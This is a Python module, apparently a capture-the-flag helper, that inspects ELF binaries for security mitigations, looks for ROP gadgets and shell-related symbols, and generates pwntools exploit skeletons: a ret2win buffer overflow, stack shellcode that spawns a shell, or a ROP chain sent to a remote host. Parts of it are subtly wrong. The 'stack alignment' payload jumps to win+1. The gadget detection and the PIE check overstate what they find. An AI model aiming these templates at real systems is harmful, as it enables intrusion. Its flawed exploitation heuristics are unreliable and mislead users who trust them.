"""ELF binary parsing and checksec security inspection engine.

Provides dependency-free analysis of Linux ELF binaries:
1. Architecture, Class (32-bit / 64-bit), Endianness, ABI.
2. Checksec mitigation audit:
   - RELRO (No RELRO, Partial RELRO, Full RELRO via GNU_RELRO & BIND_NOW/NOW)
   - Stack Canary (symbol lookup or __stack_chk_fail strings)
   - NX / DEP (GNU_STACK segment permissions: RWE vs RW)
   - PIE (ET_EXEC vs ET_DYN, DF_1_PIE)
   - RPATH / RUNPATH checks
3. Basic ROP Gadget scanner (pop rdi; ret, ret, etc.)
4. Automatic pwntools exploit template synthesis
"""

from __future__ import annotations

import re
import struct
from typing import Any

EI_MAG0 = 0
EI_MAG3 = 3
EI_CLASS = 4
EI_DATA = 5
EI_VERSION = 6
EI_OSABI = 7

ELFCLASS32 = 1
ELFCLASS64 = 2
ELFDATA2LSB = 1
ELFDATA2MSB = 2

ET_NONE = 0
ET_REL = 1
ET_EXEC = 2
ET_DYN = 3
ET_CORE = 4

PT_NULL = 0
PT_LOAD = 1
PT_DYNAMIC = 2
PT_INTERP = 3
PT_NOTE = 4
PT_SHLIB = 5
PT_PHDR = 6
PT_GNU_STACK = 0x6474E551
PT_GNU_RELRO = 0x6474E552

PF_X = 1
PF_W = 2
PF_R = 4

DT_NULL = 0
DT_NEEDED = 1
DT_PLTGOT = 3
DT_HASH = 4
DT_STRTAB = 5
DT_SYMTAB = 6
DT_BIND_NOW = 24
DT_FLAGS = 30
DT_FLAGS_1 = 0x6FFFFFFB


def checksec(elf_data: bytes) -> dict[str, Any]:
    """Parse ELF binary and extract security mitigations (checksec parity)."""
    if len(elf_data) < 52 or elf_data[:4] != b"\x7fELF":
        return {"error": "Not a valid ELF binary"}

    is_64 = elf_data[EI_CLASS] == ELFCLASS64
    is_little = elf_data[EI_DATA] == ELFDATA2LSB
    endian = "<" if is_little else ">"

    arch = "x86_64" if (is_64 and elf_data[18:20] == b"\x3e\x00") else ("x86" if elf_data[18:20] == b"\x03\x00" else "other")
    elf_type = struct.unpack(f"{endian}H", elf_data[16:18])[0]

    # Program headers
    if is_64:
        e_phoff = struct.unpack(f"{endian}Q", elf_data[32:40])[0]
        e_phentsize = struct.unpack(f"{endian}H", elf_data[54:56])[0]
        e_phnum = struct.unpack(f"{endian}H", elf_data[56:58])[0]
    else:
        e_phoff = struct.unpack(f"{endian}I", elf_data[28:32])[0]
        e_phentsize = struct.unpack(f"{endian}H", elf_data[42:44])[0]
        e_phnum = struct.unpack(f"{endian}H", elf_data[44:46])[0]

    has_gnu_relro = False
    has_gnu_stack = False
    nx_enabled = True
    dynamic_offset = None
    dynamic_size = None

    for i in range(e_phnum):
        ph_offset = e_phoff + i * e_phentsize
        if ph_offset + (56 if is_64 else 32) > len(elf_data):
            break

        if is_64:
            p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack(
                f"{endian}IIQQQQQQ", elf_data[ph_offset : ph_offset + 56]
            )
        else:
            p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align = struct.unpack(
                f"{endian}IIIIIIII", elf_data[ph_offset : ph_offset + 32]
            )

        if p_type == PT_GNU_RELRO:
            has_gnu_relro = True
        elif p_type == PT_GNU_STACK:
            has_gnu_stack = True
            if (p_flags & PF_X) != 0:
                nx_enabled = False
        elif p_type == PT_DYNAMIC:
            dynamic_offset = p_offset
            dynamic_size = p_filesz

    # Dynamic segment analysis (BIND_NOW / NOW flag)
    bind_now = False
    has_rpath = False
    has_runpath = False

    if dynamic_offset and dynamic_size and dynamic_offset + dynamic_size <= len(elf_data):
        entry_size = 16 if is_64 else 8
        num_entries = dynamic_size // entry_size
        for i in range(num_entries):
            d_off = dynamic_offset + i * entry_size
            if is_64:
                d_tag, d_val = struct.unpack(f"{endian}QQ", elf_data[d_off : d_off + 16])
            else:
                d_tag, d_val = struct.unpack(f"{endian}II", elf_data[d_off : d_off + 8])

            if d_tag == DT_NULL:
                break
            if d_tag == DT_BIND_NOW:
                bind_now = True
            elif d_tag == DT_FLAGS and (d_val & 0x08):  # DF_BIND_NOW
                bind_now = True
            elif d_tag == DT_FLAGS_1 and (d_val & 0x01):  # DF_1_NOW
                bind_now = True
            elif d_tag == 15:  # DT_RPATH
                has_rpath = True
            elif d_tag == 29:  # DT_RUNPATH
                has_runpath = True

    # Compute RELRO status
    if has_gnu_relro:
        relro_status = "Full RELRO" if bind_now else "Partial RELRO"
    else:
        relro_status = "No RELRO"

    # Compute Canary status (look for __stack_chk_fail in strings / symbol tables)
    canary_found = b"__stack_chk_fail" in elf_data

    # Compute PIE status
    if elf_type == ET_EXEC:
        pie_status = "No PIE (Executable)"
    elif elf_type == ET_DYN:
        pie_status = "PIE enabled (DSO / Position Independent)"
    else:
        pie_status = f"Unknown ({elf_type})"

    # Find common gadgets / symbols
    symbols_found: list[str] = []
    for sym in (b"system", b"/bin/sh", b"win", b"flag", b"backdoor", b"print_flag", b"shell", b"execve"):
        if sym in elf_data:
            symbols_found.append(sym.decode("latin-1"))

    # ROP Gadget scanning for x86_64
    gadgets: list[str] = []
    if is_64:
        # pop rdi; ret -> 5f c3
        idx = elf_data.find(b"\x5f\xc3")
        if idx != -1:
            gadgets.append("pop rdi; ret")
        # pop rsi; pop r15; ret -> 5e 41 5f c3
        if b"\x5e\x41\x5f\xc3" in elf_data or b"\x5e\xc3" in elf_data:
            gadgets.append("pop rsi; ret")
        # ret -> c3
        if b"\xc3" in elf_data:
            gadgets.append("ret")

    return {
        "format": f"ELF {64 if is_64 else 32}-bit {'LSB (Little Endian)' if is_little else 'MSB (Big Endian)'}",
        "arch": arch,
        "type": "ET_EXEC" if elf_type == ET_EXEC else ("ET_DYN" if elf_type == ET_DYN else str(elf_type)),
        "relro": relro_status,
        "canary": canary_found,
        "nx": "NX enabled" if nx_enabled else "NX disabled (Executable Stack)",
        "pie": pie_status,
        "rpath": "Yes" if has_rpath else "No",
        "runpath": "Yes" if has_runpath else "No",
        "interesting_symbols": symbols_found,
        "rop_gadgets": gadgets,
    }


def generate_pwntools_script(checksec_res: dict[str, Any], binary_name: str = "./vuln", remote_host: str = "target.ctf.id", remote_port: int = 1337) -> str:
    """Generate professional pwntools exploit template based on inspected binary protections."""
    is_64 = "64-bit" in checksec_res.get("format", "")
    arch = "amd64" if is_64 else "i386"
    canary = checksec_res.get("canary", False)
    nx_off = "disabled" in checksec_res.get("nx", "").lower()

    lines = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        f"# Binary Architecture & Checksec Mitigations:",
        f"# Arch:     {arch}",
        f"# RELRO:    {checksec_res.get('relro')}",
        f"# Canary:   {'Enabled' if canary else 'Disabled'}",
        f"# NX:       {checksec_res.get('nx')}",
        f"# PIE:      {checksec_res.get('pie')}",
        "",
        f"exe = context.binary = ELF('{binary_name}')",
        f"context.terminal = ['tmux', 'splitw', '-h']",
        "",
        "host = args.HOST or '" + remote_host + "'",
        f"port = int(args.PORT or {remote_port})",
        "",
        "def start_process(argv=[], *a, **kw):",
        "    if args.REMOTE:",
        "        return remote(host, port)",
        "    if args.GDB:",
        "        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)",
        "    return process([exe.path] + argv, *a, **kw)",
        "",
        "gdbscript = '''",
        "init-pwndbg",
        "continue",
        "'''.format(**locals())",
        "",
        "# ===========================================================",
        "#                    EXPLOIT GOES HERE",
        "# ===========================================================",
        "",
        "io = start_process()",
        "",
    ]

    if "interesting_symbols" in checksec_res and "win" in checksec_res["interesting_symbols"]:
        lines.extend([
            "# Found 'win' symbol in binary!",
            "win_addr = exe.symbols.get('win', 0x4011f6)",
            "log.info(f'Win function: {hex(win_addr)}')",
            "",
            "offset = 72 # Adjust via cyclic",
            "payload = flat({",
            "    offset: [",
            "        p64(win_addr + 1) if context.arch == 'amd64' else p32(win_addr), # stack alignment ret",
            "        p64(win_addr) if context.arch == 'amd64' else p32(win_addr)",
            "    ]",
            "})",
            "io.sendline(payload)",
        ])
    elif nx_off:
        lines.extend([
            "# NX is disabled! Shellcode on stack execution possible.",
            "shellcode = asm(shellcraft.sh())",
            "io.sendline(shellcode)",
        ])
    else:
        lines.extend([
            "# Standard ROP / ret2libc template",
            "offset = 72 # Adjust via cyclic",
            "rop = ROP(exe)",
            "payload = flat({offset: rop.chain()})",
            "io.sendline(payload)",
        ])

    lines.extend([
        "",
        "io.interactive()",
    ])

    return "\n".join(lines)
